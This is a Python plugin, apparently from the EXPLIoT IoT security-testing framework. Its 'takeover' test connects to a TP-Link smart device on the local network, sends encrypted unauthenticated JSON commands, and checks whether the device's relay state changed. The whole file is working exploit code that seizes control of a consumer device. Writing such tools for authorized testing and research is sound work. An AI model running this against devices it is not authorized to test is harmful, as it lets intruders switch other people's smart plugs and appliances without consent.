"""Sample test/plugin for TPLink smart devices"""


import socket
import json
from expliot.core.tests.test import TCategory, Test, TLog, TTarget
from expliot.core.vendors.tplink import crypto, PORT


class TPLinkTakeover(Test):
    """Test for TPLink Smart devices"""

    def __init__(self):
        """Initialize the test for TPlink smart devices"""
        super().__init__(
            name="takeover",
            summary="TPLink Smart device takeover",
            descr="This plugin sends unauthorized commands to a TP-Link smart device "
            "connected on the same network",
            author="Appar Thusoo",
            email="appar@payatu.com",
            ref=[
                "https://www.softscheck.com/en/reverse-engineering-tp-link-hs110/",
                "https://github.com/softScheck/tplink-smartplug"],
            category=TCategory(TCategory.TCP, TCategory.SW, TCategory.EXPLOIT),
            target=TTarget(TTarget.TP_LINK_IOT, "1.0", TTarget.TP_LINK),
        )

        self.argparser.add_argument(
            "-d",
            "--data",
            required=True,
            help="Decrypted json from crypto.tpliot.decrypt",
        )

        self.argparser.add_argument(
            "-r",
            "--rhost",
            required=True,
            help="IP address of TPlink Smart device"
        )

        self.argparser.add_argument(
            "-p",
            "--rport",
            default=PORT,
            type=int,
            help="Port number of the smart device service. Default is {}".format(PORT),
            required=True
        )

    def execute(self):
        """Execute the test."""
        try:

            # Step 1 : Connect to socket host:port
            sock_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock_tcp.connect((self.args.rhost, self.args.rport))

            # Step 2 : Send encrypted data and save response
            data = crypto.encrypt(self.args.data)
            sock_tcp.settimeout(10.0)
            sock_tcp.send(data)
            data_tp = sock_tcp.recv(2048)
            # Step 3 : Check for Empty or no response
            if data_tp is None or len(data_tp) == 0:
                reason = "Empty or no reponse received"
                TLog.fail(reason)
                self.result.setstatus(passed=False, reason=reason)
            else:
                # Step 4 : Convert bytes array to hex string
                data_tp = "".join(map(chr, list(data_tp)))
                data_tp = [hex(ord(b))[2:] for b in list(data_tp)]
                data_tp = [i if len(i) == 2 else "0" + i for i in data_tp]
                data_tp = "".join(data_tp)
                # Step 5 : Decrypt the hex string
                TLog.generic("Received Response: {}".format(data_tp))
                data_tp = crypto.decrypt(data_tp)
                TLog.generic("Decrypted Response: {}".format(data_tp))
                data_tp = json.loads(data_tp)
                # Step 6 : Check for reason of failture
                if data_tp.get("system") and\
                        data_tp.get("system").get("err_msg"):
                    reason = data_tp.get("system").get("err_msg")
                    TLog.fail(reason)
                    self.result.setstatus(passed=False, reason=reason)
                elif data_tp.get("system") and\
                        not data_tp.get("system").get("err_msg") and\
                        data_tp.get("system").get("set_relay_state") and\
                        data_tp.get("system").get("set_relay_state").get("err_msg"):
                    reason = data_tp.get("system").get("set_relay_state").get("err_msg")
                    TLog.fail(reason)
                    self.result.setstatus(passed=False, reason=reason)
                elif data_tp.get("system") and\
                        not data_tp.get("system").get("err_msg") and\
                        data_tp.get("system").get("set_relay_state") and\
                        not data_tp.get("system").get("set_relay_state").get("err_msg"):
                    TLog.generic("Test Passed")
                else:
                    reason = "Invalid Response."
                    TLog.fail(reason)
                    self.result.setstatus(passed=False, reason=reason)
        except socket.timeout:
            reason = "Connection timed out."
            TLog.fail(reason)
            self.result.setstatus(passed=False, reason=reason)
        except socket.error:
            reason = "Could not connect to host {}:{}".format(self.args.rhost, str(self.args.rport))
            TLog.fail(reason)
            self.result.setstatus(passed=False, reason=reason)
        finally:
            if sock_tcp:
                sock_tcp.close()
